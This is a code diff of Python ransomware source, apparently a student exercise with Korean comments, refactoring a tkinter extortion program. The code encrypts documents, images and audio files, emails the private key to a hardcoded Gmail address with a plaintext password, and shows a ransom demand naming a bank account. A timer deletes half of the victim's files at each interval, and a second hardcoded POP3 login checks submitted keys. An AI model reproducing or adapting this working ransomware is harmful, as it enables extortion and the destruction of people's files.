@@ -19,14 +19,14 @@ import tkinter
 from tkinter.ttk import Label
 from PIL import Image, ImageTk
 
-# self.window.protocol("WM_DELETE_WINDOW", self.disable_event(self))
 iv = os.urandom(16)
 UUID = uuid.getnode()
-extlist = \
+ext_list = \
     ['doc', 'docx', 'txt', 'hwp', 'ppt', 'pptx', 'xlsx', 'xls', 'pdf',
      'jpg', 'jpeg', 'png', 'gif',
      'mp3', 'wav', 'wma',
      'psd', 'pdd', 'ai', 'dwg', 'dxf', '3dm']
+
 
 class AnimatedGIF(Label, object):
     def __init__(self, master, path, forever=True):
@@ -129,11 +129,11 @@ def resource_path(relative_path):
     """ Get absolute path to resource, works for dev and for PyInstaller """
     base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
     print(os.path.join(base_path, relative_path))
-    return (os.path.join(base_path, relative_path))
+    return os.path.join(base_path, relative_path)
+
 
 class MyTk:
-    def __init__(self, parent=None):
-        self.parent = parent
+    def __init__(self):
         self.pw = ""
         self.window = tkinter.Tk()
         self.window.title("ransomware")
@@ -148,7 +148,7 @@ class MyTk:
                                          "\nSend the money to the account below, and send the details and your UUID to the below e-mail."
                                          "\nOUR ACCOUNT : KB 786102-00-040854"
                                          "\nOUR E-MAIL ADDRESS : secureantdd@gmail.com"
-                                         "\nYOU UUID : "+str(UUID)+
+                                         "\nYOU UUID : " + str(UUID) +
                                          "\nIf you dont, every hour half of all files will be deleted."
                                          "\n------WARNING------"
                                          "\nDo not terminate this program."
@@ -169,35 +169,31 @@ class MyTk:
         self.password = tkinter.Entry(self.window)
         self.password.pack()
 
-        self.pwbutton = tkinter.Button(self.window, text="Decode", command=self.keySubmit, disabledforeground='green')
-        self.pwbutton.pack()
+        self.pw_button = tkinter.Button(self.window, text="Decode", command=self.key_submit, disabledforeground='green')
+        self.pw_button.pack()
 
         self.thanos = tkinter.PhotoImage(file=resource_path("ui/face.png"))
         self.l_thanos = tkinter.Label(self.window, image=self.thanos, borderwidth=0, compound="center",
                                       highlightthickness=0)
         self.l_thanos.pack()
 
-
-    def keySubmit(self):
+    def key_submit(self):
         self.pw = str(self.password.get())
 
         self.l_input.config(text=" The keys are being checked ... ")
-        self.pwbutton.config(state='disabled')
+        self.pw_button.config(state='disabled')
 
-        if (self.parent and self.parent.checkPassword(self.pw)):
-            self.finalGui()
+        if check_key(self.pw):
+            self.all_decrypted()
         else:
-            self.pwbutton.config(state='normal')
+            self.pw_button.config(state='normal')
             self.l_input.config(text=" It's the wrong key.")
 
-
-
-
-    def finalGui(self):
+    def all_decrypted(self):
         self.l_timer.destroy()
         self.l_input.destroy()
         self.password.destroy()
-        self.pwbutton.destroy()
+        self.pw_button.destroy()
         self.l_thanos.destroy()
 
         self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", font='Helvetica 16 bold')
@@ -205,17 +201,12 @@ class MyTk:
         self.final_image = tkinter.PhotoImage(file=resource_path("ui/final_thanos.png"))
         self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
         self.l_final.pack()
-        #sleep(5)
-        #self.window.destroy()
 
-
-
-    def allRemovePrint(self):
-
+    def all_removed(self):
         self.l_timer.destroy()
         self.l_input.destroy()
         self.password.destroy()
-        self.pwbutton.destroy()
+        self.pw_button.destroy()
         self.l_thanos.destroy()
 
         self.l_text.config(text="\n\n\n\nAll your files are deleted.\n\n", fg="red",
@@ -263,10 +254,8 @@ def dec(cipher, in_filename, out_filename=None):
 
         # RSA : 파일의 크기와 암호화된 AES 키 추출
         size_of_data = e_data[:11].lstrip(b'0').decode()
-        #크기가 0 바이트일 때
-        if(size_of_data == ''):
-            with open(out_filename, 'wb') as outfile:
-                pass
+        # 크기가 0 바이트일 때
+        if size_of_data == '':
             return
         size_of_data = int(size_of_data)
         aes_key_enc = e_data[11:139]  # 암호화된 aes 키 (128바이트)
@@ -284,23 +273,23 @@ def dec(cipher, in_filename, out_filename=None):
             outfile.write(d_data)
 
 
-def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
+def remove_files(gui, remove_file_list):
     gui.l_thanos.destroy()
     gui.l_thanos = AnimatedGIF(gui.window, resource_path("ui/thanos1.gif"))
     gui.l_thanos.pack()
 
     sleep(2)
-    random.shuffle(remove_filelist)
+    random.shuffle(remove_file_list)
 
-    if (len(remove_filelist) >= 2):
-        n = len(remove_filelist) // 2
+    if len(remove_file_list) >= 2:
+        n = len(remove_file_list) // 2
         for i in range(n):
-            os.remove(remove_filelist[i])
+            os.remove(remove_file_list[i])
 
-    elif (len(remove_filelist) == 1):
-        os.remove(remove_filelist[0])
+    elif len(remove_file_list) == 1:
+        os.remove(remove_file_list[0])
         gui.listWindow.destroy()
-        gui.allRemovePrint()
+        gui.all_removed()
 
     gui.l_thanos.pack_forget()
     gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos, borderwidth=0, compound="center", highlightthickness=0)
@@ -308,17 +297,18 @@ def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
 
     gui.listWindow.destroy()
 
-    startTimer(gui, os.getcwd())  # @@
+    start_timer(gui, os.getcwd())  # @@
 
 
 def search_dir(file_list,dir_path):
     for name in os.listdir(dir_path):
         if os.path.isfile(os.path.join(dir_path,name)):
-            for i in extlist:
+            for i in ext_list:
                 if name.endswith(i):
                     file_list.append(os.path.join(dir_path,name))
         elif os.path.isdir(os.path.join(dir_path,name)):
             search_dir(file_list,os.path.join(dir_path,name))
+
 
 def enc_search_dir(file_list,dir_path):
     for name in os.listdir(dir_path):
@@ -328,37 +318,38 @@ def enc_search_dir(file_list,dir_path):
         elif os.path.isdir(os.path.join(dir_path,name)):
             enc_search_dir(file_list,os.path.join(dir_path,name))
 
-def startTimer(gui, path, ext=None):
+
+def start_timer(gui, path, ext=None):
     sleep(1)
 
-    antdd_filelist = []
+    antdd_file_list = []
 
-    enc_search_dir(antdd_filelist, path)
+    enc_search_dir(antdd_file_list, path)
 
-    if len(antdd_filelist) == 0:
-        gui.allRemovePrint()
+    if len(antdd_file_list) == 0:
+        gui.all_removed()
         return
 
     gui.listWindow = tkinter.Toplevel(gui.window)
     gui.listWindow.title('Encrypt File You Have')
     gui.listWindow.geometry("800x400")
     gui.listWindow.configure(background="black")
-    gui.list = tkinter.Label(gui.listWindow, text='\n'.join(['[' + x + ']' for x in antdd_filelist]),
+    gui.list = tkinter.Label(gui.listWindow, text='\n'.join(['[' + x + ']' for x in antdd_file_list]),
                              background="black", fg="green",
                              font='Helvetica 14 bold')
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 15, antdd_filelist)
+    clock(gui, 3, antdd_file_list)
 
 
-def clock(gui, sec, antdd_filelist):
+def clock(gui, sec, antdd_file_list):
     sec -= 1
 
     # 0초가 되면!
     if sec == -2:
         # 파일 삭제를 시작함
-        removeFiles(gui, antdd_filelist)
+        remove_files(gui, antdd_file_list)
         return
 
     # 분초로 타이머 나타내기
@@ -370,8 +361,38 @@ def clock(gui, sec, antdd_filelist):
     gui.l_timer.config(text=min_sec)
 
     # 자기 자신 호출
-    threading.Timer(1, clock, [gui, sec, antdd_filelist]).start()
+    threading.Timer(1, clock, [gui, sec, antdd_file_list]).start()
 
+
+def check_key(gui_input=None):
+    # 서버와 연동/ 로그인
+    SERVER = "pop.gmail.com"
+    server = poplib.POP3_SSL(SERVER)
+    server.user('secureantdd@gmail.com')
+    server.pass_('antdd1234')
+
+    # 수신함(server.list()) 에서 메일 가져와서 하나씩 분석
+    for i in range(len(server.list()[1]),0,-1):
+        msg = server.retr(i)[1]
+        uuid = msg[12].decode()[msg[12].decode().find(':') + 2:].strip()
+        key = b'\n'.join(msg[15:]).decode()
+
+        # 만약 같은 주소의 사용자에게 온 메일이 있다면
+        if uuid == str(UUID):
+            # 만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
+            if key.strip() == gui_input.strip():
+                # 해당 메일 삭제
+                server.dele(i)
+                server.quit()
+
+                # 복호화 및 타겟파일 삭제
+                dec_target_list = []
+                enc_search_dir(dec_target_list, os.getcwd())
+                for dec_target in dec_target_list:
+                    dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
+                    os.remove(dec_target)
+                return True
+    return False
 
 class RealMain:
 
@@ -384,8 +405,7 @@ class RealMain:
         self.public_key = self.rsa_key.publickey().export_key()  # 공개키
         self.private_key = self.rsa_key.export_key()  # 비밀키
 
-        self.myGui = MyTk(parent=self)  # 자기자신에 대한 레퍼런스를 가지는 gui 객체 생성
-
+        self.gui = MyTk()
 
     def run(self):
         # smtp 로그인 후 비밀키 전송
@@ -398,65 +418,33 @@ class RealMain:
 
         msg['Subject'] = str(UUID)  # 사용자의 Mac 주소를 제목으로 전송
         msg['To'] = 'secureantdd@gmail.com'
-        smtp.sendmail('secureantdd@gmail.com', 'secureantdd@gmail.com', msg.as_string())
+        smtp.sendmail('secureantdd@gmail.com', 'antdd1234', msg.as_string())
 
         smtp.quit()
 
-        enc_targetlist = []
-        search_dir(enc_targetlist, os.getcwd())
+        enc_target_list = []
+        # search_dir(enc_target_list, os.getcwd())
+        search_dir(enc_target_list, os.path.join(os.getcwd(), 'test'))
 
-
-        for enc_target in enc_targetlist:
+        for enc_target in enc_target_list:
             if enc_target.split('.')[-1] == 'antdd':
                 continue
             enc(self.key, PKCS1_OAEP.new(RSA.importKey(self.public_key)), enc_target,
                 out_filename=None)
             os.remove(enc_target)
 
-        th1 = threading.Thread(target=startTimer, args=[self.myGui, os.getcwd()])  # @@
+        th1 = threading.Thread(target=start_timer, args=[self.gui, os.getcwd()])  # @@
         th1.daemon = True
         th1.start()
 
-       # self.myGui.window.protocol("WM_DELETE_WINDOW", self.myGui.disable_event)
-        self.myGui.window.mainloop()
-
-    def checkPassword(self, gui_input=None):
-        # 서버와 연동/ 로그인
-        SERVER = "pop.gmail.com"
-        server = poplib.POP3_SSL(SERVER)
-        server.user('secureantdd@gmail.com')
-        server.pass_('antdd1234')
-
-        # 수신함(server.list()) 에서 메일 가져와서 하나씩 분석
-        for i in range(len(server.list()[1])):
-            msg = server.retr(i + 1)[1]
-            uuid = msg[12].decode()[msg[12].decode().find(':') + 2:]
-            key = b'\n'.join(msg[15:]).decode()
-
-            # 만약 같은 주소의 사용자에게 온 메일이 있다면
-            if uuid == str(UUID):
-                # 만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
-                if key.strip() == gui_input.strip():
-                    # 해당 메일 삭제
-                    server.dele(i + 1)
-                    server.quit()
-
-                    ##! 복호화 및 타겟파일 삭제
-                    dec_targetlist = []
-                    enc_search_dir(dec_targetlist, os.getcwd())
-                    for dec_target in dec_targetlist:
-                        dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
-                        os.remove(dec_target)
-
-                    return True
-
+       # self.gui.window.protocol("WM_DELETE_WINDOW", self.myGui.disable_event)
+        self.gui.window.mainloop()
 
 
 if __name__ == "__main__":
-    for i in range(2):
-        with open("test" + str(i) + '.txt', 'wb') as testfile:
-            testfile.write('테스트입니다'.encode())
-    os.makedirs(os.path.join(os.getcwd(),'test'))
+
+    if not os.path.isdir(os.path.join(os.getcwd(), 'test')):
+        os.makedirs(os.path.join(os.getcwd(), 'test'))
     for i in range(2):
         with open("test/test" + str(i) + '.txt', 'wb') as testfile:
             testfile.write('테스트입니다'.encode())
